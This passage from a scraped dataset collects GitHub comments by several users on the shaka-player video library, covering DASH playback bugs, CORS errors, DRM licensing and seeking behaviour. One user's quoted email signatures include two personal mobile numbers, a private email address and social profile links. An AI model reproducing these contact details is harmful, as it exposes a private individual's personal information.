FAILURE\nBuild step 'Execute shell' marked build as failure\n```\n. All tests passed!. ",
    "tsinghal18": "Hi Team,\nI am also facing similar issue.\nI am using mp4box with following command-\n-rap -url-template -frag 2000 -mpd-title \"\"{1}\"\" -dash 10000 -out \"\"{0}\"\" -sample-groups-traf -profile onDemand \"\"{2}\"\"\" \nThe output only consist of initmp4 file and mpd file, hence there are no individual m4s files produced.\nHow do I check segmenttime line of my content, My MPD contains following lines-\n113440_928_dashinit.mp4\n\n\n\nand this is same for all bitrates. \n. ",
    "gonemad": "Just to let you know this bug is still present in 1.4.2.  The test page shows the behavior as well\n. ",
    "byronclark": "I see the corruption in both Chrome 44 and Safari 8.0.7 on Mac. I do not see any corruption on seek in Chrome 44 on Windows.\n. Chromium bug filed: https://code.google.com/p/chromium/issues/detail?id=516039\n. ",
    "randeeppr": "Looks like its the issue with time. its either trying to play from the past or from future. Can someone help me identifying this. \n. What does this actually says\n@availabilityStartTime seems to be inaccurate; some segments may not be available yet: currentPresentationTime 3876.003000020981 latestAvailableSegmentEndTime 16023.052288888888\n@availabilityStartTime seems to be inaccurate; some segments may not be available yet: currentPresentationTime 3876.003000020981 latestAvailableSegmentEndTime 16023.104544444444\nIs the player trying to play the segments which is not generated yet? or the ones which were too old?\n. Hi Joey,\nIt is solved. We were using Envivio encoder for the live stream.  Envivio support has changed something and its working now.\nThank you.\n. How can I enable it?\nI have enabled eme_logger in chrome. \n. @tdrews @joeyparrish \nit was an issue related to widevine and CGMS flag. They have given me a workaround. You can internally check with them. The ticket number is 5-2916000008909.\nThanks and regards,\nRandeep\n. Latest update is that it is related to  chrome browser.\n. I was using 1.5.0.\nI'll check with 1.6.0 tomorrow and update here.\nIs it required that we need to use https for streams and license servers in\n1.6.0?\nAnd I was getting Allow-origin hearder errors even though I had given * for\nit on 1.6.0. So I switched back to1.5.0.\nRegards,\nRandeep\nOn Thu, Dec 3, 2015 at 12:47 AM, Joey Parrish notifications@github.com\nwrote:\n\nSounds like a duplicate of #185\nhttps://github.com/google/shaka-player/issues/185, which was fixed in\nv1.6.0. What version of Shaka Player are you using?\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/google/shaka-player/issues/241#issuecomment-161403016\n.\n\n\nRandeep\nMob: +919447831699[kerala]\nMob: +919880050349[B'lore]\nhttp://twitter.com/Randeeppr\nhttp://in.linkedin.com/in/randeeppr\n[image: --]\nRandeep Raman\n[image: http://]about.me/Randeeppr\nhttp://about.me/Randeeppr\n. @joeyparrish \nNo Joey. Can you check if there anything wrong with my http headers?\nXMLHttpRequest cannot load http://live.domain.com/dash/russiatoday/audio1/Header.m4s. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://vod.domain.com' is therefore not allowed access.\ncurl -I http://live.domain.com/dash/russiatoday/audio1/Header.m4s\nHTTP/1.1 200 OK\nContent-Length: 0\nServer: Halo Origin Server\nContent-Type: video/mp4\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Headers: Origin, Content-Type, Access-Control-Allow-origin, Range, Date, Accept\nAccess-Control-Expose-Headers: Access-Control-Allow-Origin, Content-Length, Content-Type, Date, Range, Server, Transfer-Encoding\nAccess-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS\nCache-Control: max-age=10\nDate: Sat, 12 Dec 2015 08:21:47 GMT\nConnection: keep-alive\nRegards,\nRandeep\n. @joeyparrish \n:)\nHere is the result.\n[root@localhost ~]# curl -I http://live.domain.com/dash/russiatoday/audio1/Header.m4s?123456\nHTTP/1.1 200 OK\nContent-Length: 0\nServer: Halo Origin Server\nContent-Type: video/mp4\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Headers: Origin, Content-Type, Access-Control-Allow-origin, Range, Date, Accept\nAccess-Control-Expose-Headers: Access-Control-Allow-Origin, Content-Length, Content-Type, Date, Range, Server, Transfer-Encoding\nAccess-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS\nCache-Control: max-age=10\nDate: Mon, 14 Dec 2015 03:32:19 GMT\nConnection: keep-alive\nRegards,\nRandeep\n. Joey,\nCan you please send me your email id?\nRegards,\nRandeep\nOn Mon, Dec 14, 2015 at 9:47 PM, Joey Parrish notifications@github.com\nwrote:\n\nWell, then it's not related to cache-busting. I don't see any obvious\nproblem with the Access-Control headers here.\nAre you using cookies and/or the withCredentials flag in the request? If\nyou were sending cross-origin credentials, you would need\nAccess-Control-Allow-Credentials: true.\nI can't think of any other reason for CORS to fail. If you can send me the\nreal manifest URL privately, I could help you debug. Otherwise, I'm stumped.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/google/shaka-player/issues/241#issuecomment-164481930\n.\n\n\nRandeep\nMob: +919447831699[kerala]\nMob: +919880050349[B'lore]\nhttp://twitter.com/Randeeppr\nhttp://in.linkedin.com/in/randeeppr\n[image: --]\nRandeep Raman\n[image: http://]about.me/Randeeppr\nhttp://about.me/Randeeppr\n. @joeyparrish \nWe are using Envivio JIT packager to package the dash. In its CENC configuration, we can give only one key and keyid.\nDo we need to encrypt video and audio using different keys? Else CDM will reject it?\nCan you please send an email to randeep123@gmail.com so that I can reply to you with the license details.\nI have created a ticket with widevine also. Some details are there. Hope you have access to that.\nTicket details : [8-1842000012930] CENC with custom Key\n. @joeyparrish, Thank you. This error was fixed by giving Key ID of 128 bit length. I had to prefix \"0\"s before encoding with base64.\n. @joeyparrish, OS is Windows 8.\n. @joeyparrish, I couldnt see anything in that. And I am not able to reproduce the error also. Now on the chrome there is no error and I can see this. But no errors. \n\n. Not sure this is Shaka's.\n```\nProperty    Value\ndebug   Dropping audio frame which failed decode with timestamp: 1992089467 us, duration: 0 us, packet size: 284 bytes\nplayer_id   129\nrender_id   14\nLog \nproperty filter\nTimestamp   Property    Value\n00:00:00 00 debug   Dropping audio frame which failed decode with timestamp: 1843353467 us, duration: 0 us, packet size: 304 bytes\n00:00:00 00 debug   Dropping audio frame which failed decode with timestamp: 1843374800 us, duration: 0 us, packet size: 252 bytes\n00:00:00 00 debug   Dropping audio frame which failed decode with timestamp: 1843396133 us, duration: 0 us, packet size: 293 bytes\n00:00:00 01 debug   Dropping audio frame which failed decode with timestamp: 1843417467 us, duration: 0 us, packet size: 278 bytes\n00:00:00 01 debug   Dropping audio frame which failed decode with timestamp: 1843438800 us, duration: 0 us, packet size: 247 bytes\n00:00:00 01 debug   Dropping audio frame which failed decode with timestamp: 1843460133 us, duration: 0 us, packet size: 243 bytes\n00:00:00 02 debug   Dropping audio frame which failed decode with timestamp: 1843481467 us, duration: 0 us, packet size: 251 bytes\n```\n. @joeyparrish, Evivio fixed this. Now its playing fine. Thank you Joey. Closing this.\n. ",
    "gerwinbrunner": "We would need the same. It would be awesome to have a callback for each video and being able to change the url completely for each video before loading it actually.\nWe are thinking of dynamically generate temporary (secure) S3 url which work for 15min per video.\n. ",
    "priyajeet": "If the contents of the MPD are being fetched from /foo/bar/baz.mpd, and the server expects some authentication headers in that request, then yeah one would need the MPD url to also go through the same interceptor. This is just for getting the static MPD. Basically anything leaving the domain of the dash library needs to be intercepted by the app before it hits the server.\n. Thanks for getting this implemented. One thing I did notice was that the MPD fetching bypasses the request callback. Wouldn't requesting the MPD also go through the callback for consistancy?\n. oh ok, thanks, I also updated my ticket above and that makes sense now.\n. @joeyparrish Will this change also impact #232 \n. Our rest endpoint for serving a dash segment (or any content type for that matter) returns a 202 to tell the client that the requested representation is still being processed. Search for 202 here https://docs.box.com/reference#download-a-file\nIn our use case (Box), a user uploads their media file and then clicks the file right after upload. At this point some segments may have been converted, while others are still being processed. We start the video stream as soon as the MPD file is ready + moov atom segments are ready (1st two segments typically). At this point, making a request to a non-converted future segment will return a 202. Ideally this should be considered not a success (similar to 404) and the client should just retry with some backOffFactor.\nI am not sure if there are other people with similar examples. Currently we modified the shaka player (v1) locally to add special case for 202. So just wondering if something can be implemented at the shaka player level to prevent a local modification on our end. Thanks.\nhttp://stackoverflow.com/questions/9794696/how-do-i-choose-a-http-status-code-in-rest-api-for-not-ready-yet-try-again-lat\n. ",
    "sridhard": "Hi @joeyparrish ,\nIs this feature not available for the latest V2 player\n. @joeyparrish is there any update on this? We want to use fairplay DRM in safari OSx.\nAs per #1447 fairplay is supported using fps1.0. Can we use fps1.0 in production? . Hi @joeyparrish ,\nWe are using widevine service from 3rd party. 3rd party service charges us for each time the license is queried from them. But 3rd party service has to option to generate licenses which are valid for one month.\nTo use license with one month validity we need to cache them and should not query again from 3rd party server. How can we achieve this if chrome browser does not support persistent license? Is there any alternative?\nOr is it possible to cache the license in our server and return the license when widevine ask for license? Widevine license request has a opaque body. I am not sure whether it changes for each request..Can we retrun the cached license from our server instead of generating it from 3rd party server every time?\n. Hi @joeyparrish ,\nI have checked widevine website https://www.widevine.com/product_news.html.\n_Posted: April 15, 2016\nWe had a busy year in 2015 launching new and updated products like the iOS SDK; Shaka Player with offline playback, captioning and cast support; and key security improvements for Chrome and Android. We have a ton of exciting things planned for 2016 and look forward to sharing more details in the coming months!_ \nThere is a mention about offline playback with shaka player. Is it not related to google chrome?\n. Hi,\nCan you please let me know in which version of Windows Chrome persistent\nlicenses are  supported in beta\nOn 17-Dec-2017 12:01 AM, \"Joey Parrish\" notifications@github.com wrote:\n\nChrome 64, with persistent license support on Mac & Windows, is in beta.\nShaka-based applications will not need to be updated to take advantage\nof this feature in Chrome.\nI'm going to go ahead and close this bug, but please feel free to reply\nwith any questions you might have about this.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/512#issuecomment-352201751,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AC5MuArxoRgJGvkklP-PeXNEvd58PIwdks5tBAyPgaJpZM4J5qoR\n.\n. Hi,\n\nThanks for helping.  You can close this issue\nOn 5 Oct 2016 03:09, \"Joey Parrish\" notifications@github.com wrote:\n\n@sridhard https://github.com/sridhard, does this answer your question?\nDo you still need help with this, or can we close this issue?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/531#issuecomment-251521706,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AC5MuLesBOWYUsDkQUFBVVqWD9e-0smEks5qwseCgaJpZM4KFjqK\n.\n. Hi,\n\nWhat version of Shaka Player are you using?\nCan you reproduce the issue with our latest release version?\n//I have not tried using the release version\nCan you reproduce the issue with the latest code from master?\n//Yes. I am able to reproduce using the code from master\nAre you using the demo app or your own custom app?\nIf custom app, can you reproduce the issue using our demo app?\n//I am able to reproduce with demo app.\nWhat browser and OS are you using?\n//Mac and chrome. I faced the same issue with windows and chrome\nWhat did you do?\nWhat content did you load?\n//I disabled the audo play mode and tried to play the content manually\nIf standard demo asset, which one?\nIf custom asset, what manifest and license server URIs?\n//I used custom asset: https://s3-ap-southeast-1.amazonaws.com/learnyst/schools/1094/courses/6677/paid/25963/online/tst/2016-05-18_20.12_SSC_CGL_Quant_Advance_MathswebTrack.mpd\nHow did you interact with the content, if at all?\n//Play the content manually (disable auto play). The issue will be reproduced once in 10-15 times\nWhat did you expect to happen?\nWhat actually happened?. @joeyparrish \nI have taken the latest master code and used the demo player to test the content. I have removed the auto play from the video tag in the index.html of demo player.\nSteps:\n1. Launch the demo player and give the custom manifest URL(https://s3-ap-southeast-1.amazonaws.com/learnyst/schools/1094/courses/6677/paid/25963/online/tst/2016-05-18_20.12_SSC_CGL_Quant_Advance_MathswebTrack.mpd)\n\n\nOnce the play button is displayed, wait for 5 seconds\n\n\nAfter 5-10 sec press the play button\n\n\nRepeat the process for 10-15 times. \n\n\nMost of the times the content will be played when the play button is pressed. Some times it will display the loading progress and will not play the content. If we seek little bit then the content will start playing immediately \n. @joeyparrish are you able to reproduce the issue? Do you need any help from me?. @joeyparrish I have another video where this issue is reproduced most of the time https://s3-ap-southeast-1.amazonaws.com/learnyst/schools/1075/courses/8921/paid/42061/online/tst/2016-11-14_20_01__CGL17_Maths_Live_ClasswebTrack.mpd. @joeyparrish I have tested this content with DASH player(http://dashif.org/reference/players/javascript/1.4.0/samples/dash-if-reference-player/) and it plays fine.\nhttps://s3-ap-southeast-1.amazonaws.com/learnyst/schools/1075/courses/8921/paid/42061/online/tst/2016-11-14_20_01__CGL17_Maths_Live_ClasswebTrack.mpd\nBut this content fails to play without seeking in shaka  player.\nI have tried both shaka and DASH in chrome browser. @TheModMaker with DASH reference player(http://dashif.org/reference/players/javascript/1.4.0/samples/dash-if-reference-player/) I am able to play the content.\nIn shaka player this content will play only when we seek initially.. @joeyparrish @TheModMaker I have tried this content with expressplay SDK also. The content is played successfully. Can you please help in resolving the issue in shaka player. @TheModMaker I have tested the latest code. But still the issue exist.. @TheModMaker this is the content URL: https://s3-ap-southeast-1.amazonaws.com/learnyst/schools/1075/courses/8921/paid/42061/online/tst/2016-11-14_20_01__CGL17_Maths_Live_ClasswebTrack.mpd. @TheModMaker . Sorry. It was my mistake. The issue is resolved Thanks a lot. The same issue is observed with the hosted demo shaka player also. @joeyparrish have you got any chance to check this issue. thanks. ok. @TheModMaker any updates on this. @joeyparrish @ismena Any updates on this issue? can we use the master branch? I have seen that you have committed code for this issue. @ismena in which branch the Shaka UI library is getting developed?. ok...thanks for the detailed explain. @joeyparrish @ismena I have played in chrone native HLS player and also in https://www.hlsplayer.net/.\nThe video plays without any error in the same chrome browser version.\nNew chrome browser is not yet available and also it takes time for the users to upgrade to new version.\nCan shaka player ignore this error and continue play the video like other players?\nThis will make shaka robust to errors.\nPlease check whether we can fix this in shaka player also. . @joeyparrish but how other players like https://www.hlsplayer.net/ can play it? May be can we follow the same strategy as them?. ok..thanks. ok..thanks. ",
    "kfwerf": "Nevermind i added this simple patch, left the code below in case anyone else wants to use it. Its pretty crappy but it works for my implemntation.\nI only added the comments and author so i can find back what i modded in case of future updates. \nCheers!\n/lib/dash/dynamic_live_segment_index.js\nLines 71-78\njavascript\n      /**\n      * Implementation of override for initial early segment\n      * @author kenneth.vanderwerf@magine.com (Kenneth van der Werf)\n      * @type {number}\n      */\n     earliestSegmentNumber =\n         (shaka.dash.DynamicLiveSegmentIndex.overrideEarliestRange_ ||\n         earliestSegmentNumber);\nLines 281-288\njavascript\n  /**\n   * Implementation of override for initial early segment\n   * @author kenneth.vanderwerf@magine.com (Kenneth van der Werf)\n   * @type {number}\n   */\n  var earliestSegmentNumber =\n      (shaka.dash.DynamicLiveSegmentIndex.overrideEarliestRange_ ||\n      (earliestAvailableSegmentStartTime / scaledSegmentDuration) + 1);\nLines 304-315\n``` javascript\n/*\n * If higher than 0, will set a override to the earliest range\n * Allows seeking further back, to as far back as segment 1\n * @author kenneth.vanderwerf@magine.com (Kenneth van der Werf)\n * @type {number}\n * @private\n /\nshaka.dash.DynamicLiveSegmentIndex.overrideEarliestRange_ = 1;\n```\n. Cheers! Ill add a gist of the code somewhere for reference once im done adding it, might be helpfull for the shaka player and am not a official contributor yet \n. We added some initial segmented subtitle support. See here: https://github.com/tvoli/shaka-player/pull/3\nOur implementation is not really by the book yet so i dont think we can add it as a contribution yet, but maybe its a nice reference for implementing segmented subtitles\n. i have a PR that implemented segmented webvtt. Maybe it is of some use to this project,\nhttps://github.com/google/shaka-player/pull/291\n. ",
    "jozefchutka": "would it be possible to implement fix in the shaka player so it would not throw these exceptions?\n. hi joeyparrish, the async solution is not ideal in my case as I need to destroy old instance / change source synchronously. Is it preffered the Player instance to be reused or new one to be recreated for every new source?\n. @joeyparrish you can see I try to create a new video instance for each Player insntance so that should not be an issue. I have also tried to remove  element in dispose method but the same exceptions appear. I understand that EME APIs are asynchronous, however I would expect shaka to correctly handle its own implementation. There is no problem with playback not being initiated but rather there are exceptions flying around like Cannot read property 'addEventListener' of null that could easily be avoided on shaka side.\nIn my realworld application I need to navigate around a singe page app and there is  in some sections. I prefer to create and add new video and new shaka for each of these sections as it might require different drm/configuration etc., but I can not guarantee the user will wait long enough for async process to finish when he navigates to a new page.\n. @joeyparrish, I can not recall why I needed to call unload() before destroy(), but I can confirm that even without unload() being called it does work the same in my test. So I can see the same exception while new video being created correctly and old one is gone. If I recall the reason, I will report it as a separate issue. \nBy saying easily avoided I referred to the fact that apart from the exception in the console the player works as expected, and as that one seems to be a null pointer it can be avoided by having a null check in place. I do not have a patch or fix on my side.\n. great job. thanks @joeyparrish \n. I signed it!. I signed it!. hi Joey,\n\njust like you say, these apis like generateKeyRequest exists without webkit prefix. I cant say its \"EME v0.1b\" or something else as the available doc for the device doesnt state such information. \non the platform window.performance.webkitNow() is available while window.performance.now() is not.\nalso there was a third thing with FakeEvent which I had to replace by CustomEvent see around code event2.initCustomEvent('encrypted'.... \n\nThe way I worked is I copied PatchedMediaKeysWebkit into PatchedMediaKeys so if you compare these files you will see they are almost identical.\n. hi Joey,\n\njust like you say, these apis like generateKeyRequest exists without webkit prefix. I cant say its \"EME v0.1b\" or something else as the available doc for the device doesnt state such information. \non the platform window.performance.webkitNow() is available while window.performance.now() is not.\nalso there was a third thing with FakeEvent which I had to replace by CustomEvent see around code event2.initCustomEvent('encrypted'.... \n\nThe way I worked is I copied PatchedMediaKeysWebkit into PatchedMediaKeys so if you compare these files you will see they are almost identical.\n. @Joey it makes sense to parametrize the existing PatchedMediaKeys. Do you also have any idea how to handle the FakeEvent problem for 'encrypted' event? I can also try to polyfill performance.now, last time there was some issue with that. \nHowever, I have no idea of the timeline and when the update would be ready, hopefully within next few weeks.... @Joey it makes sense to parametrize the existing PatchedMediaKeys. Do you also have any idea how to handle the FakeEvent problem for 'encrypted' event? I can also try to polyfill performance.now, last time there was some issue with that. \nHowever, I have no idea of the timeline and when the update would be ready, hopefully within next few weeks.... using FakeEvent it throws UNSPECIFIED_EVENT_TYPE_ERR: DOM Events Exception 0: The Event's type was not specified by initializing the event before the method was called. so I replaced it with CustomEvent (copied from PatchedMediaKeysMs). using FakeEvent it throws UNSPECIFIED_EVENT_TYPE_ERR: DOM Events Exception 0: The Event's type was not specified by initializing the event before the method was called. so I replaced it with CustomEvent (copied from PatchedMediaKeysMs). @joeyparrish updated. see the latest PR and changes. There are some issues with polyfilling performance, it seems that it only lives for a thread or something, lets say if I do \nwindow.performance.now = window.performance.webkitNow\nit works in the next line, but it doesnt work after a second or so... . @joeyparrish updated. see the latest PR and changes. There are some issues with polyfilling performance, it seems that it only lives for a thread or something, lets say if I do \nwindow.performance.now = window.performance.webkitNow\nit works in the next line, but it doesnt work after a second or so... . hi Joey, I did these changes you requested, now it will take some time to test as I do not have access to the device right away, I will confirm its working here asap (today).. hi Joey, I did these changes you requested, now it will take some time to test as I do not have access to the device right away, I will confirm its working here asap (today).. Hi Joey, thanks for merging, latest master works with dTV. There will be one more PR sooner or later as we dont see adaptation switching for widevine video on dTV.... intestigating. Hi Joey, thanks for merging, latest master works with dTV. There will be one more PR sooner or later as we dont see adaptation switching for widevine video on dTV.... intestigating. fix in https://github.com/google/shaka-player/pull/643. Yes, thats correct.. Do you have any recommendation how to polyfill this? As TextTrackCue exist on window object but requires arguments just like these:\nhttp://www.w3schools.com/TAGs/av_met_addtexttrack.asp\nhttps://www.w3.org/WAI/GL/wiki/Using_the_TextTrack_API_to_provide_captions_dynamically\nand I am not able to find other specs that would define official constructor and its arguments.. TextTrackCue.prototype.constructor.length doesnt return 7 but 1, and so there is no other reliable way of detecting constructor argument count. We will implement polyfill on project level as this (most probably) will not get approved.. what would you say if I try catch constructing TextTrackCue with 3 and 7 args as a part of polyfill?. Surely I do not want exceptions during real playback, but only during initial polyfill install phase. Once correct construction is detected, the polyfill would reference the right one.. thanks @chrisfillmore \n1. Our content is both VOD and Live with seeking. Do you have any suggestions if this was for VOD only?\n2. 192x108 @112227\n3. actually VOD can be between 5 minutes to few hours, same for live\n4. single period at this point\nPlease shout any ideas  you can think of.. thanks @chrisfillmore \n1. Our content is both VOD and Live with seeking. Do you have any suggestions if this was for VOD only?\n2. 192x108 @112227\n3. actually VOD can be between 5 minutes to few hours, same for live\n4. single period at this point\nPlease shout any ideas  you can think of.. I see your point. So probably that would be too large portion of data to load upfront that would even affect initial adaptation/quality. \nDownloading 1 segment of the lowest quality is relatively quick, but for some reasons we can see rather a few segments downloaded for each seek, do you have any idea why that is happening? May it be its looking for a keyframe or similar reason? Any way to avoid it?. I see your point. So probably that would be too large portion of data to load upfront that would even affect initial adaptation/quality. \nDownloading 1 segment of the lowest quality is relatively quick, but for some reasons we can see rather a few segments downloaded for each seek, do you have any idea why that is happening? May it be its looking for a keyframe or similar reason? Any way to avoid it?. Is there a way/api to get information where to seek to get to the beginning of the segment? So lets say instead of seeking to time 12345 (middle of segment file), I would seek to 12347 which is exactly the start time of a segment?. Is there a way/api to get information where to seek to get to the beginning of the segment? So lets say instead of seeking to time 12345 (middle of segment file), I would seek to 12347 which is exactly the start time of a segment?. Using the following code we are able to seek to the beginning of the segment:\njs\nfunction fixSeekTime(time) {\n    var track = thumbnailPlayer.getVariantTracks().find(function(track){return track.active === true;});\n    var variant = thumbnailPlayer.getManifest().periods[0].variants.find(function(variant){return variant.id === track.id;});\n    var position = variant.video.findSegmentPosition(time);\n    var reference = variant.video.getSegmentReference(position);\n    return reference.startTime;\n}\nhowever we can still see 2 segments are downloaded, then following information from thumbnailPlayer.getBufferedInfo().video[0] it seems it loads one extra segment behind. Although config.streaming.bufferBehind = 0. Using the following code we are able to seek to the beginning of the segment:\njs\nfunction fixSeekTime(time) {\n    var track = thumbnailPlayer.getVariantTracks().find(function(track){return track.active === true;});\n    var variant = thumbnailPlayer.getManifest().periods[0].variants.find(function(variant){return variant.id === track.id;});\n    var position = variant.video.findSegmentPosition(time);\n    var reference = variant.video.getSegmentReference(position);\n    return reference.startTime;\n}\nhowever we can still see 2 segments are downloaded, then following information from thumbnailPlayer.getBufferedInfo().video[0] it seems it loads one extra segment behind. Although config.streaming.bufferBehind = 0. hi @joeyparrish \nwe are able to remove audio tracks on fly (on client) from manifest so for thumbnail player instance its only video segments loaded. Can you please elaborate a bit on \"some off-by-one logic we have to deal with manifest inaccuracies\" maybe that is why we see 2 video segments downloaded for each seek.\nI understand there are better and more optimal ways of displaying thumbnails, including jpeg sheet/sprite or trick play track, and we would surely prefer to use that when available. However we do not have control over streaming server or manifest creation in this case - so looking for options on client.\nWe will play around with buffering options further, at this point browser level segment caching works good enough to no to keep additional data on JS heap.\nWe believe we have reached quite solid implementation at this point, the only remaining question remains why two video segments of the same profile are loaded for each seek, and if there is a way to avoid it, and so, to speed up rendering the \"thumbnail\" frame.. hi @joeyparrish \nwe are able to remove audio tracks on fly (on client) from manifest so for thumbnail player instance its only video segments loaded. Can you please elaborate a bit on \"some off-by-one logic we have to deal with manifest inaccuracies\" maybe that is why we see 2 video segments downloaded for each seek.\nI understand there are better and more optimal ways of displaying thumbnails, including jpeg sheet/sprite or trick play track, and we would surely prefer to use that when available. However we do not have control over streaming server or manifest creation in this case - so looking for options on client.\nWe will play around with buffering options further, at this point browser level segment caching works good enough to no to keep additional data on JS heap.\nWe believe we have reached quite solid implementation at this point, the only remaining question remains why two video segments of the same profile are loaded for each seek, and if there is a way to avoid it, and so, to speed up rendering the \"thumbnail\" frame.. Hi @TheModMaker ,\nUnderstood, I think I have also identified the piece of code you are referring to ( https://github.com/google/shaka-player/blob/master/lib/media/streaming_engine.js#L1355 ) that causes the additional segment to be loaded. Is there an elegant way you can suggest to customize streaming engine in runtime, so it does not optimize segment position? For now I have commented out that line of code in sources, and works perfect. However I was thinking if this is something that can be handled without having to do custom shaka build?. Hi @TheModMaker ,\nUnderstood, I think I have also identified the piece of code you are referring to ( https://github.com/google/shaka-player/blob/master/lib/media/streaming_engine.js#L1355 ) that causes the additional segment to be loaded. Is there an elegant way you can suggest to customize streaming engine in runtime, so it does not optimize segment position? For now I have commented out that line of code in sources, and works perfect. However I was thinking if this is something that can be handled without having to do custom shaka build?. Thanks everyone, I believe I have collected enough information for further work.. Thanks everyone, I believe I have collected enough information for further work.. righ I used wrong link in the comment, this one is the one with 7 args http://www.w3schools.com/TAGs/av_met_addtexttrack.asp just like on Toshiba. ",
    "jkarsrud": "Sorry about that, it totally slipped my mind! It should all be done now! \n. Yes, that's correct. \nA better example: When I start streaming I get a start of ~5000~ and end of ~11000 through the seekrangechanged event. If I set the currentTime to ~7000, the end will \u2014 after a few seconds \u2014 become ~7000 instead of the expected ~11000. So the live-edge seems to be moved back to where I seeked. \nIf I seek by using the scrubber, the seeking works as expected, with the live-edge staying where it's supposed to.\nI haven't been able to figure out where in shaka-player this happens other than what events are fired, or if it might be an issue with the streaming server sending some data that's misinterpreted. I will keep digging to see if I can figure out why this happens. \n. Sorry I haven't been able to get back to you on this, but it's great that you eventually found a way to repro and fix this! :+1:\n. ",
    "Feenposhleen": "Yes, we have a minBufferTime of 30, and have not touched the shaka setting. This bug is probably it.\nI will reply again tomorrow after some experimentation.\n. Okay, so the issue is confirmed for our use case. Changing the encoders to deliver 12s minBufferTime solved it. Thanks a lot!\nI'm gonna sneak in another question while I'm at it; what is the easiest way to modify the \"safety padding\" that Shaka applies to the live edge?\n. Awesome responses. Very helpful. Thanks again!\nAlso major bonus points for RFC-esque ASCII diagrams in the source comments. =)\n. Thank you! I did stumble upon the supportsCaching() method in the interface, but thought it would have other implications and side effects as well. I'm going to try this out and see how it performs. \n. Okay, so I poked around a bit. The supportsCaching method seems to be inhibited by the fact that all manifest requests also has the AjaxRequest.parameters.synchronizeClock set to true. The conditional that determines if the URL should be cache-busted always passes if this is set.\nSo the result is quite the opposite of what we'd like; the video segments doesn't get cache-busted, but the manifest does.\n. Okay, fair enough. We've patched this by crudely checking the URL string of a request to determine whether or not it is an .mpd being requested. If so, we disable cache busting. \nThanks for the quick replies as always! Looking forward to 2.0.\n. Just wanted to say that this is an issue for us as well. If the video freezes during playback because it lacks data, then a \"buffering\" event should be emitted immediately. Any other behaviour seems sketchy. For us the main problem is to be able to track buffering times that our customers have. For this we want precision that is not possible if the the event emissions are offset by the time it takes to resolve the final segment. \nI would consider this to be a fairly major issue.\n. All right! Thanks for the clarifications. \nWhile reading I thought of another argument to not provide a default:\nSuppose the technical details of a DRM implementation is dictated by rights acquisition terms. Setting a low default level would mask the need to make an explicit choice, leading to a potential breach of contract toward the rights holders. It makes a lot of sense to not mute the warning so that people like me need to look up the details and spec.\nEDIT: Unless a high level robustness doesn't lead to more effective DRM, in which case my point is moot.\n. I'm satisfied, thanks. You can close it.\n. Our live stream segments are always kept even after the event has ended, to be available for a while as catch-up. The manifest doesn't change. Loading such a manifest after the event has ended works fine. Loading it while live also works, but as soon as wall time passes the end of the \"live presentation\", and no matter where the playhead is, Shaka emits an ended event and stops playback. A practical example:\n\nI want to see the live soccer game that started one hour ago, so I start the stream. \nI want to see the entire game, so I seek to the start and continue to watch from there.\nOne hour before the game ends for me, the stream dies, because it ended according to wall clock.\n\nThe segments are still there, and the manifest is the same. Loading it again results in VOD-like catchup behaviour, which is expected and good. Hard to explain, but I hope that made it slightly clearer. :). @vaage @kqyang Thanks. As I pointed out, loading the exact same manifest after the event has ended results in well functioning VOD playback (starting from beginning, etc). This indicates to me that changes in the manifest would not be required. \nIf Shaka supports manifest attributes being modified on the fly as @vaage described, then the logic to do so might need to account for this scenario as well. Evaluating the mode of playback based not only on attributes, but also on some combination of playback position + wall time + live window.. @joeyparrish I'm very sorry, but it turns out that I've been wrong; the manifest does indeed change. The timeline part seems to remain pretty much the same, with the exception of the removal of presentationTimeOffset. The relevant snippets from the manifests:\nLive manifest:\n```xml\n\n[...]\n\n 2018-07-27T06:24:39.682645Z / 1532672679 - 2018-07-27T07:11:30.562645Z \n\n\n\n\n```\nSame manifest after event ended:\n```xml\n\n[...]\n\n 2018-07-27T06:24:39.682645Z / 1532672679 - 2018-07-27T07:15:01.762645Z \n\n\n\n\n```\nEDIT: Might be interesting/worth noting that the manifests are created just-in-time from Unified Streaming Platform v1.8.4\nEDIT2: If you want to test the actual content, we will have to discuss that in a more private channel. Might be a bit complicated since the scenarios rely on (euro tz) event times, and the fact that all our content is encrypted. However I'm sure we can work something out if we tried.. @TheModMaker Okay, thanks. I don't quite understand how the presentation time would be 0 in the VOD case though, when there is a presentationTimeOffset present of 73568288622720. To me it would seem that the first segment is at 1\u00a0532\u00a0672\u00a0679.64 seconds in both cases. Am I missing something?. @TheModMaker Great doc! I can see now how a transition between the timelines would be complex. I suppose the conversion between media time and the \"segment timeline\" is a very core component of the manifest parser. I will then try to silver tape together a fix using request filters instead. Such a great escape hatch while waiting for slow moving encoder changes.\nThanks for all the assistance!. ",
    "philipbulley": "Sorry for the delay. No luck with Safari 8.0.8 across any of the Shaka versions. The GPAC/SegmentList video is the most likely to begin playback across versions, but will always throw an error when you attempt to seek. The \"Car\" (YT DASH test) doesn't start on any Shaka player version.\nI've also tested with Safari 9 (11601.1.39.0.2) via Browserstack and getting better results, but still quite erratic. \"Car\" (YT DASH test) will start playback but when seeking, shaka will throw the following error:\nMultiple buffered ranges detected: (3)\n\"Either the content has gaps in it,\"\n\"the content's segments are not aligned across bitrates,\"\n\"or the browser has evicted the middle of the buffer.\"\ngshaka-player-demo.appspot.com:74:177\n. ",
